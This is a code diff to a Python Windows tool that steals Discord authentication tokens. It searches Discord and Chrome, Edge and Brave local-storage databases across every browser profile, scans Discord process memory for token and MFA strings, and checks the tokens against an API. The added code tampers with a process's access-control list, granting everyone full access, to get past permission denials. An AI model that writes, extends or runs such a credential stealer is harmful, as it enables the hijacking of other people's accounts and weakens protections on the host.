@@ -2,8 +2,6 @@ import ctypes
 import ctypes.wintypes as wintypes
 import os
 import re
-import sys
-import time
 from pathlib import Path
 
 import psutil
@@ -25,12 +23,37 @@ V8_ANCHOR   = b"\x6D\x00\x00\x00\x05token\x6D\x00\x00\x00\x03"
 
 PROCESS_VM_READ          = 0x0010
 PROCESS_QUERY_INFORMATION = 0x0400
+WRITE_DAC                = 0x00040000
+PROCESS_ALL_ACCESS       = 0x001FFFFF
 MEM_COMMIT  = 0x1000
 MEM_IMAGE   = 0x1000000
 PAGE_READABLE = {0x02, 0x04, 0x08, 0x20, 0x40, 0x80}
 
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
 ntdll    = ctypes.WinDLL("ntdll",    use_last_error=True)
+advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
+
+class SID_IDENTIFIER_AUTHORITY(ctypes.Structure):
+    _fields_ = [("Value", ctypes.c_ubyte * 6)]
+
+advapi32.AllocateAndInitializeSid.restype = wintypes.BOOL
+advapi32.AllocateAndInitializeSid.argtypes = [
+    ctypes.POINTER(SID_IDENTIFIER_AUTHORITY), ctypes.c_ubyte,
+    wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
+    wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
+    ctypes.POINTER(ctypes.c_void_p),
+]
+advapi32.FreeSid.restype = None
+advapi32.FreeSid.argtypes = [ctypes.c_void_p]
+advapi32.InitializeAcl.restype = wintypes.BOOL
+advapi32.InitializeAcl.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD]
+advapi32.AddAccessAllowedAce.restype = wintypes.BOOL
+advapi32.AddAccessAllowedAce.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
+advapi32.SetSecurityInfo.restype = wintypes.DWORD
+advapi32.SetSecurityInfo.argtypes = [
+    ctypes.c_void_p, ctypes.c_int, wintypes.DWORD,
+    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+]
 
 class MEMORY_BASIC_INFORMATION(ctypes.Structure):
     _fields_ = [
@@ -42,6 +65,27 @@ class MEMORY_BASIC_INFORMATION(ctypes.Structure):
         ("Protect",           wintypes.DWORD),
         ("Type",              wintypes.DWORD),
     ]
+
+kernel32.OpenProcess.restype = wintypes.HANDLE
+kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+kernel32.CloseHandle.restype = wintypes.BOOL
+kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
+kernel32.ReadProcessMemory.restype = wintypes.BOOL
+kernel32.ReadProcessMemory.argtypes = [
+    wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID,
+    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t),
+]
+kernel32.VirtualQueryEx.restype = ctypes.c_size_t
+kernel32.VirtualQueryEx.argtypes = [
+    wintypes.HANDLE, wintypes.LPCVOID,
+    ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t,
+]
+kernel32.GetStdHandle.restype = wintypes.HANDLE
+kernel32.GetStdHandle.argtypes = [wintypes.DWORD]
+kernel32.GetConsoleMode.restype = wintypes.BOOL
+kernel32.GetConsoleMode.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
+kernel32.SetConsoleMode.restype = wintypes.BOOL
+kernel32.SetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.DWORD]
 
 class PROCESS_BASIC_INFORMATION(ctypes.Structure):
     _fields_ = [
@@ -69,6 +113,32 @@ def enable_ansi():
     kernel32.SetConsoleMode(handle, mode.value | 4)
 
 def open_process(pid):
+    h = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
+    if h:
+        return h
+
+    h = kernel32.OpenProcess(WRITE_DAC, False, pid)
+    if not h:
+        return None
+
+    world_sid = ctypes.c_void_p()
+    auth = SID_IDENTIFIER_AUTHORITY()
+    for i, b in enumerate((0, 0, 0, 0, 0, 1)):
+        auth.Value[i] = b
+    try:
+        if advapi32.AllocateAndInitializeSid(ctypes.byref(auth), 1,
+                                             0, 0, 0, 0, 0, 0, 0, 0,
+                                             ctypes.byref(world_sid)) and world_sid.value:
+            acl = ctypes.create_string_buffer(256)
+            acl_ptr = ctypes.cast(acl, ctypes.c_void_p)
+            if (advapi32.InitializeAcl(acl_ptr, 256, 2)
+                    and advapi32.AddAccessAllowedAce(acl_ptr, 2, PROCESS_ALL_ACCESS, world_sid)):
+                advapi32.SetSecurityInfo(h, 6, 0x4, None, None, acl_ptr, None)
+    finally:
+        if world_sid.value:
+            advapi32.FreeSid(world_sid)
+        kernel32.CloseHandle(h)
+
     return kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
 
 def read_process_memory(h, base, size):
@@ -84,7 +154,7 @@ def virtual_query_ex(h, address):
     return mbi if ret else None
 
 def classify_pid(pid):
-    h = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
+    h = open_process(pid)
     if not h:
         return "unknown"
     try:
@@ -132,15 +202,13 @@ def extract_tokens_from_file(path):
         pass
     return tokens
 
-def find_anchor(buf):
-    idx = buf.find(AUTH_ANCHOR)
+def find_anchor(buf, start=0):
+    idx = buf.find(AUTH_ANCHOR, start)
     if idx >= 0:
         return idx
-    idx = buf.find(V8_ANCHOR)
-    return idx
+    return buf.find(V8_ANCHOR, start)
 
 def scan_process_fast(h):
-    found = False
     address = 0
     while True:
         mbi = virtual_query_ex(h, address)
@@ -154,12 +222,12 @@ def scan_process_fast(h):
             buf = read_process_memory(h, address, mbi.RegionSize)
             if buf:
                 hit = find_anchor(buf)
-                if hit >= 0:
-                    found = True
+                while hit >= 0:
                     win = min(len(buf) - hit, 768)
                     text = buf[hit:hit + win].decode("utf-8", errors="ignore")
                     yield from TOKEN_RE.findall(text)
                     yield from MFA_RE.findall(text)
+                    hit = find_anchor(buf, hit + 1)
         next_addr = address + mbi.RegionSize
         if next_addr <= address:
             break
@@ -196,7 +264,7 @@ def scan_discord_processes():
     for p in psutil.process_iter(["pid", "name"]):
         try:
             n = p.info["name"].lower()
-            if n in ("discord.exe", "discordptb.exe", "discordcanary.exe"):
+            if n.startswith("discord"):
                 discord_pids.append(p.info["pid"])
         except Exception:
             pass
@@ -252,8 +320,11 @@ def validate_token(token):
         )
         if resp.status_code != 200:
             return None
-        m = re.search(r'"username":"([^"]+)"', resp.text)
-        return m.group(1) if m else None
+        m_id = re.search(r'"id":"([^"]+)"', resp.text)
+        m_username = re.search(r'"username":"([^"]+)"', resp.text)
+        if not m_id or not m_username:
+            return None
+        return m_id.group(1), m_username.group(1)
     except Exception:
         return None
 
@@ -268,10 +339,25 @@ def main():
         "Discord":        os.path.join(roam, "discord",        "Local Storage", "leveldb"),
         "Discord Canary": os.path.join(roam, "discordcanary",  "Local Storage", "leveldb"),
         "Discord PTB":    os.path.join(roam, "discordptb",     "Local Storage", "leveldb"),
-        "Chrome":         os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-        "Edge":           os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-        "Brave":          os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
     }
+
+    def add_browser_profiles(browser, user_data_root):
+        if not os.path.isdir(user_data_root):
+            print(f"{RED}  Path not found: {os.path.join(user_data_root, 'Default', 'Local Storage', 'leveldb')}{RST}")
+            return
+        try:
+            for entry in os.scandir(user_data_root):
+                if not entry.is_dir():
+                    continue
+                ldb = os.path.join(entry.path, "Local Storage", "leveldb")
+                if os.path.isdir(ldb):
+                    paths[f"{browser} ({entry.name})"] = ldb
+        except Exception:
+            pass
+
+    add_browser_profiles("Chrome", os.path.join(local, "Google", "Chrome", "User Data"))
+    add_browser_profiles("Edge",   os.path.join(local, "Microsoft", "Edge", "User Data"))
+    add_browser_profiles("Brave",  os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"))
 
     candidates = set()
 
@@ -294,13 +380,20 @@ def main():
             print(f"{RED}  Error scanning {name}: {e}{RST}")
 
     valid_accounts = []
+    seen_ids = set()
 
     print(f"\n{CYNB}Validating tokens found in files...{RST}")
     for token in list(candidates):
-        username = validate_token(token)
-        if username:
-            valid_accounts.append((username, token))
-            print(f"{GRN}  Valid token found for user: {username}{RST}")
+        info = validate_token(token)
+        if not info:
+            continue
+        user_id, username = info
+        if user_id in seen_ids:
+            print(f"{GRN}  Duplicate skipped: {username} (same account, different token){RST}")
+            continue
+        seen_ids.add(user_id)
+        valid_accounts.append((username, token))
+        print(f"{GRN}  Valid token found for user: {username}{RST}")
     if not valid_accounts:
         print(f"{RED}No valid accounts found in files{RST}")
 
@@ -310,11 +403,17 @@ def main():
     for token in mem_candidates:
         if any(t == token for _, t in valid_accounts):
             continue
-        username = validate_token(token)
-        if username:
-            valid_accounts.append((username, token))
-            found_in_memory += 1
-            print(f"{GRN}  New valid token found in memory for user: {username}{RST}")
+        info = validate_token(token)
+        if not info:
+            continue
+        user_id, username = info
+        if user_id in seen_ids:
+            print(f"{GRN}  Duplicate skipped: {username} (same account, different token){RST}")
+            continue
+        seen_ids.add(user_id)
+        valid_accounts.append((username, token))
+        found_in_memory += 1
+        print(f"{GRN}  New valid token found in memory for user: {username}{RST}")
     if found_in_memory == 0:
         print(f"{RED}No other accounts found using memory scan{RST}")
 
